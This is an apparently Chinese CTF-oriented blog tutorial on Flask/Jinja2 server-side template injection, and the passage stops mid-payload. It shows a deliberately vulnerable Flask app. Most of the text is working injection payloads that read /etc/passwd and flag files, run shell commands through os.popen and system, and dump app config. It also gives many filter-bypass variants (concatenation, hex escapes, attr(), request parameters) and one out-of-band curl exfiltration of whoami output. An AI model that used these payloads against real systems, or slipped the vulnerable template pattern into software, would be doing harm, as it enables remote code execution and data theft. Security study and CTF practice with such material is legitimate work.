<div class="hljs"><pre><code class="hljs routeros">&#123;% <span class="hljs-built_in">..</span>. %&#125; <span class="hljs-keyword">for</span> Statements

&#123;&#123; <span class="hljs-built_in">..</span>. &#125;&#125; <span class="hljs-keyword">for</span> Expressions <span class="hljs-keyword">to</span> <span class="hljs-builtin-name">print</span> <span class="hljs-keyword">to</span> the template output

&#123;# <span class="hljs-built_in">..</span>. #&#125; <span class="hljs-keyword">for</span> Comments <span class="hljs-keyword">not</span> included <span class="hljs-keyword">in</span> the template output

<span class="hljs-comment">#  ... ## for Line Statements</span></code></pre></div>



<h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><ul>
<li><code>__class__</code></li>
</ul>
<p>用于返回对象所属的类</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; <span class="hljs-params">()</span>.<span class="hljs-title">__class__</span></span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">tuple</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">list</span>'&gt;</span></code></pre></div>

<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串的形式返回一个类所继承的类</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所继承的类</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>获取类的所有子类</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<code>init</code>方法，常用他当跳板来调用<code>globals</code></p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在SSTI的代码如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string
app = Flask(__name__)

<span class="hljs-meta">@app.route('/', methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    name = request.args.get(<span class="hljs-string">'name'</span>)
    template = <span class="hljs-string">'''</span>
<span class="hljs-string">&lt;html&gt;</span>
<span class="hljs-string">  &lt;head&gt;</span>
<span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span>
<span class="hljs-string">  &lt;/head&gt;</span>
<span class="hljs-string"> &lt;body&gt;</span>
<span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span>
<span class="hljs-string">  &lt;/body&gt;</span>
<span class="hljs-string">&lt;/html&gt;</span>
<span class="hljs-string">        '''</span>% (name)
    <span class="hljs-keyword">return</span> render_template_string(template)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)</code></pre></div>



<p>提交参数<code>name=1</code>，会显示1，这也是测试ssti的一种常用的方法</p>
<p>下图是常用的测试方法和对应的模板类型</p>
<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif" alt></p>
<h1 id="0x2-构造链思路"><a href="#0x2-构造链思路" class="headerlink" title="0x2 构造链思路"></a>0x2 构造链思路</h1><p>这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的<code>ssti.py</code>做实验</p>
<ul>
<li>第一步</li>
</ul>
<p>目的：使用<code>__class__</code>来获取内置类所对应的类</p>
<p>可以通过使用<code>str</code>，<code>list</code>，<code>tuple</code>，<code>dict</code>等来获取</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; "".<span class="hljs-title">__class__</span></span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">str</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">list</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; <span class="hljs-params">()</span>.<span class="hljs-title">__class__</span></span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">tuple</span>'&gt;</span>
&gt;&gt;&gt; &#123;&#125;.__class__
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">dict</span>'&gt;</span></code></pre></div>

<ul>
<li>第二步</li>
</ul>
<p>目的：拿到<code>object</code>基类</p>
<p>用<code>__bases__[0]</code>拿到基类</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__bases__[<span class="hljs-number">0</span>]
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>

<p>用<code>__base__</code>拿到基类</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__base__
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>

<p>用<code>__mro__[1]</code>或者<code>__mro__[-1]</code>拿到基类</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__mro__[<span class="hljs-number">1</span>]
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span>
<span class="hljs-class">&gt;&gt;&gt; ''.<span class="hljs-title">__class__</span>.<span class="hljs-title">__mro__</span>[-1]</span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>

<ul>
<li>第三步</li>
</ul>
<p>用<code>__subclasses__()</code>拿到子类列表</p>
<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()
...一大堆的子类</code></pre></div>

<ul>
<li>第四步</li>
</ul>
<p>在子类列表中找到可以getshell的类</p>
<p>然后直接调用里面的方法即可，payload如下</p>
<h2 id="读文件payload"><a href="#读文件payload" class="headerlink" title="读文件payload"></a>读文件payload</h2><div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;

&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">'/etc/passwd'</span>).readlines()&#125;&#125;</code></pre></div>



<h2 id="命令执行构造"><a href="#命令执行构造" class="headerlink" title="命令执行构造"></a>命令执行构造</h2><p>在双大括号我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins</p>
<h2 id="flask内置函数"><a href="#flask内置函数" class="headerlink" title="flask内置函数"></a>flask内置函数</h2><p>这种方法之前好像没人提过</p>
<p>Flask 内置了两个函数url_for 和 get_flashed_messages,还有一些内置的对象</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;url_for.__globals__['__builtins__'].__import__(<span class="hljs-name">'os'</span>).system(<span class="hljs-name">'ls'</span>)&#125;&#125;
&#123;&#123;request.__init__.__globals__['__builtins__'].open(<span class="hljs-name">'/flag'</span>).read()&#125;&#125;</code></pre></div>

<p>如果过滤了config,又需要查config</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;config&#125;&#125;
&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></pre></div>

<h2 id="通过基类查找子类"><a href="#通过基类查找子类" class="headerlink" title="通过基类查找子类"></a>通过基类查找子类</h2><p>虽然模块间的变量不共享,但是所有类都是object的子类,所以可以通过object类而得到其他类</p>
<p>利用</p>
<div class="hljs"><pre><code class="hljs reasonml">#python2.<span class="hljs-number">7</span>
''.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]
&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
request.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
#python3.<span class="hljs-number">7</span>
''.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
<span class="hljs-module-access"><span class="hljs-module">(</span></span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
<span class="hljs-module-access"><span class="hljs-module">&#123;</span></span>&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
<span class="hljs-module-access"><span class="hljs-module">r</span></span>equest.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
session.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
redirect.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]</code></pre></div>

<p>等得到object 对象,然后通过<code>__subclasses__()</code>方法,得到所有子类,在找重载过<code>__inti__,__repr__</code>等特殊方法的类,利用这些方法的<code>__globals__</code>得到,<code>__builtins__</code>,或者<code>os,codecs</code>等可以进行代码执行的调用.</p>
<p>常见payload</p>
<div class="hljs"><pre><code class="hljs markdown">// 59 为warnings.WarningMessag
''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-symbol">'eval'</span>]('<span class="hljs-strong">__import__</span>("os").popen("ls").read()')</code></pre></div>

<p>不使用globals的payload</p>
<div class="hljs"><pre><code class="hljs markdown">// <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">class</span> '<span class="hljs-attr">warnings.catch_warnings</span>'&gt;</span></span>类在在内部定义了<span class="hljs-emphasis">_module=sys.modules['warnings']，然后warnings模块包含有_</span><span class="hljs-emphasis">_builtins_</span>_,
如果可以找到warnings.catch_warnings类,则可以不使用  globals

''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">60</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span>_']("os").system("calc")</code></pre></div>

<h1 id="0x3-过滤绕过"><a href="#0x3-过滤绕过" class="headerlink" title="0x3 过滤绕过"></a>0x3 过滤绕过</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>利用python的魔术方法,也可以实现字典,数组取值等操作</li>
<li>Jinja2对模板做了特殊处理,所以通过</li>
</ul>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">'__init__'</span>]</span></code></pre></div>

<p>也可以访问A的方法,属性</p>
<ul>
<li><p>Jinja2 的attr 过滤器可以获得对象的属性或方法</p>
</li>
<li><p>flask内置的request对象可以得到请求的信息</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.args</span><span class="hljs-selector-class">.name</span>
<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.cookies</span><span class="hljs-selector-class">.name</span>
<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.headers</span><span class="hljs-selector-class">.name</span>
<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.values</span><span class="hljs-selector-class">.name</span>
<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.form</span><span class="hljs-selector-class">.name</span></code></pre></div>

</li>
</ul>
<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="没过滤引号"><a href="#没过滤引号" class="headerlink" title="没过滤引号"></a>没过滤引号</h3><ul>
<li>如果没用过滤引号,使用反转,或者各种拼接绕过</li>
</ul>
<div class="hljs"><pre><code class="hljs markdown">&#123;&#123;''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__snitliub__'[::-1</span>]][<span class="hljs-string">'eval'</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')&#125;&#125;

&#123;&#123;''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__buil'+'tins__'[::-1</span>]][<span class="hljs-string">'eval'</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')&#125;&#125;</code></pre></div>

<h3 id="过滤了引号"><a href="#过滤了引号" class="headerlink" title="过滤了引号"></a>过滤了引号</h3><ul>
<li>利用将需要的变量放在请求中,然后通过[],或者通过<code>attr</code>,<code>__getattribute__</code>获得</li>
</ul>
<div class="hljs"><pre><code class="hljs markdown">// url?a=eval
''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.[<span class="hljs-string">request.args.a</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')

// Cookie: aa=<span class="hljs-strong">__class__</span>;bb=<span class="hljs-strong">__mro__</span>;cc=<span class="hljs-strong">__subclasses__</span>
&#123;&#123;((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()&#125;&#125;</code></pre></div>

<ul>
<li><p>如果request被ban,可以考虑通过</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;(<span class="hljs-name">config.__str__</span>()[<span class="hljs-number">2</span>])+(<span class="hljs-name">config.__str__</span>()[<span class="hljs-number">3</span>])&#125;&#125;</code></pre></div>

<p>拼接需要的字符</p>
</li>
<li><p>查出chr函数,利用set赋值,然后使用</p>
</li>
</ul>
<div class="hljs"><pre><code class="hljs hy">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read() &#125;&#125;</code></pre></div>

<ul>
<li>利用内置过滤器拼接出,’%c’,再利用’’%语法得到任意字符</li>
</ul>
<div class="hljs"><pre><code class="hljs twig"><span class="xml">get %</span>
<span class="xml">找到特殊字符<span class="hljs-tag">&lt;<span class="hljs-name">,url编码,得到%</span></span></span>
<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> pc = g|<span class="hljs-keyword">lower</span>|list|<span class="hljs-keyword">first</span>|urlencode|<span class="hljs-keyword">first</span>%&#125;</span>


<span class="xml">get 'c'</span>

<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=dict(c=1).keys()|<span class="hljs-keyword">reverse</span>|<span class="hljs-keyword">first</span>%&#125;</span>

<span class="xml">字符串拼接</span>

<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl=dict(a=pc,c=c).values()|<span class="hljs-keyword">join</span> %&#125;</span>

<span class="xml">可以得到任意字符了</span>

<span class="xml">get _</span>
<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl2=udl%(95)%&#125;</span><span class="hljs-template-variable">&#123;&#123;udl&#125;&#125;</span></code></pre></div>

<h3 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h3><p>其他奇奇怪怪的过滤,善用Flask/Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过</p>
<p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p>
<p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p>
<ul>
<li>拼接字符绕过</li>
</ul>
<p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用<code>+</code>号或者不用</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">'__cla'</span>+<span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>]&#125;&#125;
&#123;&#123;()[<span class="hljs-string">'__cla'</span><span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>]&#125;&#125;</code></pre></div>

<p>随便写个payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">'__cla'</span><span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'ev'</span><span class="hljs-string">'al'</span>](<span class="hljs-string">"__im"</span><span class="hljs-string">"port__('o''s').po"</span><span class="hljs-string">"pen('whoami').read()"</span>)&#125;&#125;</code></pre></div>

<p>或者可以使用join来进行拼接</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;()|attr([<span class="hljs-string">"_"</span>*<span class="hljs-number">2</span>,<span class="hljs-string">"cla"</span>,<span class="hljs-string">"ss"</span>,<span class="hljs-string">"_"</span>*<span class="hljs-number">2</span>]|join)&#125;&#125;</code></pre></div>

<ul>
<li>使用使用<code>str</code>原生函数</li>
</ul>
<p><code>replace</code>绕过，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__getattribute__(<span class="hljs-string">'__claAss__'</span>.replace(<span class="hljs-string">"A"</span>,<span class="hljs-string">""</span>)).__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">376</span>].__init__.__globals__[<span class="hljs-string">'popen'</span>](<span class="hljs-string">'whoami'</span>).read()&#125;&#125;
复制代码</code></pre></div>

<p><code>decode</code>绕过，但这种方法经过测试只能在python2下使用，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__getattribute__(<span class="hljs-string">'X19jbGFzc19f'</span>.decode(<span class="hljs-string">'base64'</span>)).__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">"/etc/passwd"</span>).read()&#125;&#125;
复制代码</code></pre></div>

<ul>
<li>替代的方法</li>
</ul>
<p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">213</span>].__enter__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'open'</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;

&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">213</span>].__exit__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'open'</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;
复制代码</code></pre></div>

<p>过滤config，如果被过滤了可以使用以下的payload绕过</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="hljs-literal">None</span>&gt;
&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre></div>





<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ["></a>过滤 [</h3><p>可以使用<code>__getitem__</code>和<code>pop</code>替代中括号，取列表的第n位</p>
<div class="hljs"><pre><code class="hljs sqf"><span class="hljs-meta">#getitem、pop</span>
<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/etc/passwd'</span>).read()
<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.func_globals.linecache.os.popen(<span class="hljs-string">'ls'</span>).read()
<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">'__builtins__'</span>).<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">'__import__'</span>)(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'calc'</span>)

&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">0</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">'whoami'</span>).read()&#125;

&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">'whoami'</span>).read()&#125;&#125;</code></pre></div>

<h3 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h3><div class="hljs"><pre><code class="hljs mel">#用&#123;%%&#125;标记
&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">''</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.<span class="hljs-keyword">popen</span>(<span class="hljs-string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="hljs-string">'p'</span> %&#125;<span class="hljs-number">1</span>&#123;% endif %&#125;
这样会没有回显,考虑带外或者盲注

# 用&#123;%print%&#125;标记,有回显
&#123;%print config%&#125;</code></pre></div>

<h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>和过滤字符串一样绕过即可</p>
<p>或编码绕过</p>
<p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p>
<h1 id="0x4-实战例子"><a href="#0x4-实战例子" class="headerlink" title="0x4 实战例子"></a>0x4 实战例子</h1><h2 id="过滤-和-和-39"><a href="#过滤-和-和-39" class="headerlink" title="过滤_和.和&#39;"></a>过滤<code>_</code>和<code>.</code>和<code>&#39;</code></h2><p>这里顺便给一个不常见的方法，主要是找到<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">222</span>].get_data(<span class="hljs-number">0</span>,<span class="hljs-string">"app.py"</span>)&#125;&#125;
复制代码</code></pre></div>

<p>使用十六进制绕过后，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="hljs-string">"\x5F\x5Fbases\x5F\x5F"</span>][<span class="hljs-number">0</span>][<span class="hljs-string">"\x5F\x5Fsubclasses\x5F\x5F"</span>]()[<span class="hljs-number">222</span>][<span class="hljs-string">"get\x5Fdata"</span>](<span class="hljs-number">0</span>, <span class="hljs-string">"app\x2Epy"</span>)&#125;&#125;
复制代码</code></pre></div>




<h2 id="过滤args和-和"><a href="#过滤args和-和" class="headerlink" title="过滤args和.和_"></a>过滤<code>args</code>和<code>.</code>和<code>_</code></h2><p>之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了<code>attr()</code>绕过点，<code>values</code>绕过<code>args</code>，payload如下</p>
<div class="hljs"><pre><code class="hljs python">&#123;&#123;()|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x1'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x2'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x3'</span>])()|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(<span class="hljs-number">40</span>)|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x5'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x6'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x7'</span>])|attr(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x4'</span>])(request[<span class="hljs-string">'values'</span>][<span class="hljs-string">'x8'</span>])(request[<span class="hljs-string">'values'</span>][<span 